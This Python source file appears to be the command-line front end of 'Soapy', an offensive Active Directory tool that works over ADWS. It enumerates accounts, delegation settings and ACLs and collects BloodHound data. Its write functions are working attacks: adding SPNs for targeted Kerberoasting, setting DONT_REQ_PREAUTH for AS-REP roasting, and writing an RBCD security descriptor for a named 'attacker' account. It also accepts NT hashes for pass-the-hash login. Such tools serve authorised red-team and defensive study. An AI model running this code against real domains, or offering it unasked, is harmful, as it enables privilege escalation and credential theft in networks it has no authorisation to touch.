import argparse
import logging
import sys
import json
from base64 import b64decode, b64encode 
from uuid import UUID 

from .cache_gen import (
    pull_all_ad_objects,
    SOAPHOUND_LDAP_PROPERTIES,
    PKI_CERTDUMP_PROPERTIES,
    process_bloodhound_data,
    create_and_combine_soaphound_cache,
    _parse_aces, 
    BH_TYPE_LABEL_MAP, 
    SOAPHOUND_OBJECT_CLASS_MAPPING_TO_INT,
    SOAPHOUND_OBJECT_CLASS_PRIORITY
)

from impacket.examples.utils import parse_target
from impacket.ldap.ldaptypes import (
    ACCESS_ALLOWED_ACE, ACCESS_MASK, ACE, ACL, LDAP_SID, SR_SECURITY_DESCRIPTOR,
)
from src.adws import ADWSConnect, NTLMAuth
from src.soap_templates import NAMESPACES

def _create_empty_sd():
    sd = SR_SECURITY_DESCRIPTOR(); sd["Revision"] = b"\x01"; sd["Sbz1"] = b"\x00"
    sd["Control"] = 32772; sd["OwnerSid"] = LDAP_SID(); sd["OwnerSid"].fromCanonical("S-1-5-32-544")
    sd["GroupSid"] = b""; sd["Sacl"] = b""
    acl = ACL(); acl["AclRevision"] = 4; acl["Sbz1"] = 0; acl["Sbz2"] = 0; acl.aces = []; sd["Dacl"] = acl
    return sd

def _create_allow_ace(sid: LDAP_SID): 
    nace = ACE(); nace["AceType"] = ACCESS_ALLOWED_ACE.ACE_TYPE; nace["AceFlags"] = 0x00
    acedata = ACCESS_ALLOWED_ACE(); acedata["Mask"] = ACCESS_MASK(); acedata["Mask"]["Mask"] = 983551
    acedata["Sid"] = sid.getData(); nace["Ace"] = acedata; return nace

def getAccountDN(target: str, username: str, ip: str, domain: str, auth: NTLMAuth):
    get_account_query = f"(samAccountName={target})"
    pull_client = ADWSConnect.pull_client(ip, domain, username, auth)
    pull_et = pull_client.pull(query=get_account_query, attributes=["distinguishedname"])
    dn = None
    if pull_et is not None:
        for item_elem in pull_et.findall(".//addata:*", namespaces=NAMESPACES): 
            dn_elem = item_elem.find(".//addata:distinguishedName/ad:value", namespaces=NAMESPACES)
            if dn_elem is not None and dn_elem.text is not None: dn = dn_elem.text; break 
    if dn is None: raise ValueError(f"Unable to find DN for {target}")
    return dn

def set_spn(target: str, value: str, username: str, ip: str, domain: str, auth: NTLMAuth, remove: bool = False, debug=False):
    try:
        dn = getAccountDN(target=target,username=username,ip=ip,domain=domain,auth=auth)
        put_client = ADWSConnect.put_client(ip, domain, username, auth)
        success = put_client.put(object_ref=dn, operation="add" if not remove else "delete", attribute="addata:servicePrincipalName", data_type="string", value=value)
        if success: print(f"[+] servicePrincipalName {value} {'removed' if remove else 'written'} successfully on {target}!")
        else: logging.error(f"SPN operation failed on '{target}'. Check previous logs for details.")
    except Exception as e:
        logging.error(f"SPN operation failed: {e}")
        if debug: logging.exception("Details:")

def set_asrep(target: str, username: str, ip: str, domain: str, auth: NTLMAuth, remove: bool = False, debug=False):
    try:
        dn = getAccountDN(target=target,username=username,ip=ip,domain=domain,auth=auth)
        pull_client = ADWSConnect.pull_client(ip, domain, username, auth)
        pull_et = pull_client.pull(query=f"(distinguishedName={dn})", attributes=["userAccountControl"])
        uac_val = None
        if pull_et is not None:
            for item_elem in pull_et.findall(".//addata:*", namespaces=NAMESPACES): 
                uac_elem = item_elem.find(".//addata:userAccountControl/ad:value", namespaces=NAMESPACES)
                if uac_elem is not None and uac_elem.text is not None: uac_val = int(uac_elem.text); break
        if uac_val is None: raise ValueError(f"UAC not found for {target}")
        newUac = uac_val | 0x400000 if not remove else int(uac_val) & ~0x400000
        put_client = ADWSConnect.put_client(ip, domain, username, auth)
        success = put_client.put(object_ref=dn, operation="replace", attribute="addata:userAccountControl", data_type="string", value=str(newUac))
        if success: print(f"[+] DONT_REQ_PREAUTH {'removed' if remove else 'written'} successfully!")
        else: logging.error(f"Failed to set ASREP flag on '{target}'.")
    except Exception as e:
        logging.error(f"Failed to set ASREP flag: {e}")
        if debug: logging.exception("Details:")

def set_rbcd(target: str, account: str, username: str, ip: str, domain: str, auth: NTLMAuth, remove: bool = False, debug=False):
    try:
        target_dn_val = getAccountDN(target=target, username=username, ip=ip, domain=domain, auth=auth)
        pull_client = ADWSConnect.pull_client(ip, domain, username, auth)
        attacker_query = f"(sAMAccountName={account})"
        attacker_pull_et = pull_client.pull(query=attacker_query, attributes=["objectSid"])
        account_sid_obj: LDAP_SID | None = None
        if attacker_pull_et is not None:
            for item_elem in attacker_pull_et.findall(".//addata:*", namespaces=NAMESPACES):
                sid_elem = item_elem.find(".//addata:objectSid/ad:value", namespaces=NAMESPACES)
                if sid_elem is not None and sid_elem.text is not None:
                    try: account_sid_obj = LDAP_SID(data=b64decode(sid_elem.text)); break
                    except Exception as e_sid: logging.error(f"Error decoding SID for attacker account {account}: {e_sid}")
        if not account_sid_obj: raise ValueError(f"Attacker SID for {account} not found")
        target_sd_pull_et = pull_client.pull(query=f"(distinguishedName={target_dn_val})", attributes=["msDS-AllowedToActOnBehalfOfOtherIdentity"])
        target_sd: SR_SECURITY_DESCRIPTOR = _create_empty_sd() 
        if target_sd_pull_et is not None:
            for item_elem in target_sd_pull_et.findall(".//addata:*", namespaces=NAMESPACES):
                sd_elem = item_elem.find(".//addata:msDS-AllowedToActOnBehalfOfOtherIdentity/ad:value", namespaces=NAMESPACES)
                if sd_elem is not None and sd_elem.text is not None:
                    try: target_sd = SR_SECURITY_DESCRIPTOR(data=b64decode(sd_elem.text)); break
                    except Exception as e_sd: logging.warning(f"Could not parse existing SD for {target}: {e_sd}")
                break 
        if target_sd['Dacl'] and hasattr(target_sd['Dacl'], 'aces') and target_sd['Dacl'].aces is not None:
            target_sd['Dacl'].aces = [ace for ace in target_sd['Dacl'].aces if ace["Ace"]["Sid"].formatCanonical() != account_sid_obj.formatCanonical()]
        elif not target_sd['Dacl']: 
            target_sd['Dacl'] = ACL(); target_sd['Dacl']['AclRevision'] = 4; target_sd['Dacl']['Sbz1'] = 0; target_sd['Dacl']['Sbz2'] = 0; target_sd['Dacl'].aces = []
        if not remove: target_sd['Dacl'].aces.append(_create_allow_ace(account_sid_obj))
        put_client = ADWSConnect.put_client(ip, domain, username, auth)
        encoded_sd = b64encode(target_sd.getData()).decode("utf-8") 
        success = put_client.put(object_ref=target_dn_val, operation="replace", attribute="addata:msDS-AllowedToActOnBehalfOfOtherIdentity", data_type="base64Binary", value=encoded_sd)
        if success:
            print(f"[+] msDS-AllowedToActOnBehalfOfOtherIdentity updated on {target}!")
            print(f"[+] {account} {'can not' if remove else 'can'} delegate to {target}")
        else: logging.error(f"RBCD operation failed on '{target}'.")
    except ValueError as ve: logging.critical(str(ve))
    except Exception as e:
        logging.error(f"An unexpected error occurred during RBCD operation on '{target}' for account '{account}'.")
        if debug: logging.exception("Details:")


def run_cli():
    print("""
███████╗ ██████╗  █████╗ ██████╗ ██╗   ██╗
██╔════╝██╔═══██╗██╔══██╗██╔══██╗╚██╗ ██╔╝
███████╗██║   ██║███████║██████╔╝ ╚████╔╝
╚════██║██║   ██║██╔══██║██╔═══╝   ╚██╔╝ 
███████║╚██████╔╝██║  ██║██║        ██║ 
╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚═╝        ██║1.1
    """)

    parser = argparse.ArgumentParser(add_help=True, description="Enumerate/write LDAP via ADWS")
    parser.add_argument("connection", action="store", help="domain/user[:pass]@host", nargs='?')
    parser.add_argument("--debug", action="store_true", help="Enable DEBUG output")
    parser.add_argument("--ts", action="store_true", help="Add timestamp to logs")
    parser.add_argument("--hash", action="store", metavar="NTHASH", help="NT hash for auth")
    enum_group = parser.add_argument_group('Simple Enumeration'); enum_group.add_argument("--users", action="store_true", help="Enumerate user objects"); enum_group.add_argument("--computers", action="store_true", help="Enumerate computer objects"); enum_group.add_argument("--groups", action="store_true", help="Enumerate group objects"); enum_group.add_argument("--constrained", action="store_true", help="Enumerate msDS-AllowedToDelegateTo"); enum_group.add_argument("--unconstrained", action="store_true", help="Enumerate TRUSTED_FOR_DELEGATION"); enum_group.add_argument("--spns", action="store_true", help="Enumerate servicePrincipalName"); enum_group.add_argument("--asreproastable", action="store_true", help="Enumerate DONT_REQ_PREAUTH"); enum_group.add_argument("--admins", action="store_true", help="Enumerate adminCount=1"); enum_group.add_argument("--rbcds", action="store_true", help="Enumerate msDS-AllowedToActOnBehalfOfOtherIdentity"); enum_group.add_argument("-q", "--query", action="store", metavar="LDAP_QUERY", help="Raw LDAP query for enumeration"); enum_group.add_argument("--filter", action="store", metavar="ATTRS", help="Comma-separated attributes to select for simple enumeration")
    bh_group = parser.add_argument_group('BloodHound & Advanced Collection'); bh_group.add_argument("--bloodhound", action="store_true", help="Collect data and generate BloodHound JSON files."); bh_group.add_argument("--cache", action="store_true", help="Create/regenerate Soapy compatible cache files."); bh_group.add_argument("--nolaps", action="store_true", help="Exclude LAPS attributes during data collection."); bh_group.add_argument("--certdump", action="store_true", help="Collect PKI data and generate corresponding JSON files."); bh_group.add_argument("--bloodhound-cache", metavar="CACHE_FILE_PATH", help="Path to CombinedCache.json to assist processing.");
    ace_debug_group = parser.add_argument_group('ACE Debugging'); ace_debug_group.add_argument("--ace",action="store_true", help="Enumerate objects and display their parsed ACEs. Uses a default filter if no -q.")
    writing_group = parser.add_argument_group('Writing Operations'); writing_group.add_argument("--rbcd", action="store", metavar="SOURCE_ACC", help="Write/remove RBCD. Requires --account."); writing_group.add_argument("--spn", action="store", metavar="SPN_VALUE", help="Write SPN. Requires --account."); writing_group.add_argument("--asrep", action="store_true", help="Write DONT_REQ_PREAUTH flag. Requires --account."); writing_group.add_argument("--account", action="store", metavar="TARGET_ACC", help="Target account for write operation"); writing_group.add_argument("--remove", action="store_true", help="Remove attribute value or RBCD entry")

    if len(sys.argv) == 1: parser.print_help(); sys.exit(1)
    options = parser.parse_args()

    if options.nolaps and not (options.bloodhound or options.cache or options.certdump): parser.error("--nolaps should be used with an option that performs data collection.")
    if options.bloodhound_cache and not (options.bloodhound or options.certdump or options.ace): parser.error("--bloodhound-cache is an auxiliary option and must be used with --bloodhound, --certdump or --ace.")

    log_level = logging.DEBUG if options.debug else logging.INFO
    log_format = '%(asctime)s %(levelname)s:%(name)s:%(message)s' if options.ts else '%(levelname)s:%(name)s:%(message)s'
    logging.basicConfig(level=log_level, format=log_format, stream=sys.stdout)
    
    domain, username, password, remoteName, auth = None, None, None, None, None
    main_domain_root_dn = None 
    
    queries = { "users": "(&(objectClass=user)(objectCategory=person))", "computers": "(objectClass=computer)", "groups": "(objectCategory=group)", "constrained": "(msds-allowedtodelegateto=*)", "unconstrained": "(userAccountControl:1.2.840.113556.1.4.803:=524288)", "spns": "(&(!(objectClass=computer))(servicePrincipalName=*))", "asreproastable":"(userAccountControl:1.2.840.113556.1.4.803:=4194304)", "admins": "(adminCount=1)", "rbcds": "(msDS-AllowedToActOnBehalfOfOtherIdentity=*)", "main_collection_query": "(|(objectCategory=person)(objectCategory=computer)(objectCategory=group)(objectClass=organizationalUnit)(objectClass=domain)(objectClass=container)(objectClass=groupPolicyContainer))", "trusts_query": "(objectClass=trustedDomain)", "pki_cas_for_templates_step": "(objectClass=certificationAuthority)", "pki_main_data_query": "(|(objectClass=certificationAuthority)(objectClass=pKICertificateTemplate))" }
    
    requires_adws_connection = any([options.rbcd, options.spn, options.asrep, options.cache, options.bloodhound, options.certdump, options.ace, options.users, options.computers, options.groups, options.constrained, options.unconstrained, options.spns, options.asreproastable, options.admins, options.rbcds, options.query])

    if requires_adws_connection:
        if not options.connection: logging.critical("L'argument 'connection' est requis."); sys.exit(1)
        try: domain, username, password, remoteName = parse_target(options.connection)
        except Exception as e: logging.critical(f"Format de la chaîne de connexion invalide: {e}"); sys.exit(1)
        if not domain: logging.critical('"domain" manquant'); sys.exit(1)
        if not username: logging.critical('"username" manquant'); sys.exit(1)
        main_domain_root_dn = "DC=" + ",DC=".join(domain.split('.')) 
        if not password and not options.hash:
            if any([options.rbcd, options.spn, options.asrep]): 
                from getpass import getpass
                password = getpass("Password:")
        auth = NTLMAuth(password=password, hashes=options.hash)
    
    is_writing_op = options.rbcd or options.spn or options.asrep
    is_advanced_collection = options.bloodhound or options.cache or options.certdump or options.ace
    is_simple_enum = any([options.users, options.computers, options.groups, options.constrained, options.unconstrained, options.spns, options.asreproastable, options.admins, options.rbcds, options.query])

    if is_writing_op:
        if not options.account: logging.critical("L'option --account <TARGET_ACC> est requise pour les opérations d'écriture."); sys.exit(1)
        if options.rbcd: set_rbcd(options.account, options.rbcd, username, remoteName, domain, auth, options.remove, options.debug)
        elif options.spn: set_spn(options.account, options.spn, username, remoteName, domain, auth, options.remove, options.debug)
        elif options.asrep: set_asrep(options.account, username, remoteName, domain, auth, options.remove, options.debug)
    
    elif is_advanced_collection:
        if not auth: logging.critical("Authentification requise pour la collecte de données."); sys.exit(1)
        
        all_collected_items = []
        config_naming_context = f"CN=Configuration,{main_domain_root_dn}"
        id_to_type_cache, value_to_id_cache = {}, {}
        if options.bloodhound_cache: 
            logging.info(f"Loading auxiliary cache from: {options.bloodhound_cache}")
            try:
                with open(options.bloodhound_cache, 'r', encoding='utf-8') as f_cache: loaded_cache_data = json.load(f_cache)
                id_to_type_cache = loaded_cache_data.get("IdToTypeCache", {})
                value_to_id_cache = loaded_cache_data.get("ValueToIdCache", {})
                if id_to_type_cache: logging.info(f"Loaded {len(id_to_type_cache)} IdToType and {len(value_to_id_cache)} ValueToId entries.")
            except Exception as e_cache: logging.error(f"Failed to load cache file {options.bloodhound_cache}: {e_cache}.")
        
        attributes_to_collect = list(SOAPHOUND_LDAP_PROPERTIES)
        query_to_run = queries["main_collection_query"]
        
        # Logique spécifique pour --ace
        if options.ace:
            # Pour --ace, utiliser une liste d'attributs restreinte et sûre
            attributes_to_collect = sorted(list(set(["name", "sAMAccountName", "nTSecurityDescriptor", "objectSid", "objectGUID", "objectClass", "distinguishedName", "cn"])))
            query_to_run = options.query if options.query else queries["main_collection_query"]
        else: # Pour les autres collectes avancées
            if options.certdump: attributes_to_collect = list(set(attributes_to_collect + PKI_CERTDUMP_PROPERTIES))
            if options.nolaps and "ms-MCS-AdmPwdExpirationTime" in attributes_to_collect:
                attributes_to_collect.remove("ms-MCS-AdmPwdExpirationTime")

        logging.info(f"Starting data collection (query: '{query_to_run}')")
        data_container = pull_all_ad_objects(remoteName, domain, username, auth, query_to_run, attributes_to_collect, main_domain_root_dn)
        if data_container and data_container.get("objects"): all_collected_items.extend(data_container["objects"])
        
        # ... (Logique de collecte des trusts et PKI irait ici si options.bloodhound ou certdump)

        if not all_collected_items: logging.error("No data collected."); sys.exit(1)
        
        if options.cache:
            logging.info(f"Processing {len(all_collected_items)} AD objects for cache generation...")
            create_and_combine_soaphound_cache(all_collected_items, main_domain_root_dn)
        
        if options.ace:
            logging.info(f"Found {len(all_collected_items)} objects for ACE display. Parsing...")
            for i, item_ace in enumerate(all_collected_items):
                dn_ace = item_ace.get("distinguishedName", "Unknown DN")
                print(f"\n--- Object {i+1}: {dn_ace} ---")
                current_ntsd = item_ace.get("nTSecurityDescriptor")
                if not current_ntsd: print("  No nTSecurityDescriptor found."); continue
                
                obj_id = item_ace.get("objectSid") or item_ace.get("objectGUID") or dn_ace
                obj_type = "Unknown"
                if 'objectClass' in item_ace:
                    oc_list = [str(oc).lower() for oc in item_ace['objectClass']] if isinstance(item_ace['objectClass'], list) else [str(item_ace['objectClass']).lower()]
                    for oc_prio in SOAPHOUND_OBJECT_CLASS_PRIORITY:
                        if oc_prio in oc_list:
                            mapped_type = BH_TYPE_LABEL_MAP.get(SOAPHOUND_OBJECT_CLASS_MAPPING_TO_INT.get(oc_prio))
                            if mapped_type: obj_type = mapped_type; break
                
                has_laps = bool(item_ace.get("ms-MCS-AdmPwdExpirationTime", False)) if obj_type == "Computer" else False
                aces_list, is_protected = _parse_aces(current_ntsd, id_to_type_cache, obj_id, obj_type, has_laps)
                print(f"  IsACLProtected: {is_protected}")
                if aces_list:
                    print(f"  Parsed ACEs ({len(aces_list)}):")
                    for ace in aces_list: print(f"    - {ace}")
                else: print("  No relevant ACEs parsed for this object.")
        
        if options.bloodhound or options.certdump:
            logging.info(f"Processing {len(all_collected_items)} AD objects for BloodHound output...")
            process_bloodhound_data(all_collected_items, domain, main_domain_root_dn, id_to_type_cache, value_to_id_cache)

    elif is_simple_enum:
        query_str_enum = options.query 
        if not query_str_enum: 
            for flag, ldap_filter_str in queries.items():
                if getattr(options, flag, False) and flag in ["users", "computers", "groups", "constrained", "unconstrained", "spns", "asreproastable", "admins", "rbcds"]:
                    query_str_enum = ldap_filter_str; break
        if not query_str_enum: logging.critical("Aucune requête d'énumération valide spécifiée."); sys.exit(1)
        
        attrs_list_enum = options.filter.split(',') if options.filter else ["distinguishedName", "sAMAccountName", "objectSid"]
        
        logging.info(f"Enumerating with query: '{query_str_enum}', Attributes: {attrs_list_enum}")
        
        try:
            # Utiliser la méthode `pull` originale de la classe client qui gère l'affichage
            client = ADWSConnect.pull_client(remoteName, domain, username, auth)
            client.pull(query_str_enum, attrs_list_enum, print_incrementally=True)
        except Exception as e:
            logging.error(f"Error during enumeration: {e}")
            if options.debug: logging.exception("Details:")
    
    else: 
        if not requires_adws_connection: parser.print_help()
        else: logging.info("No specific task performed. Use --help for options.")
    
    sys.exit(0)

if __name__ == "__main__":
    run_cli()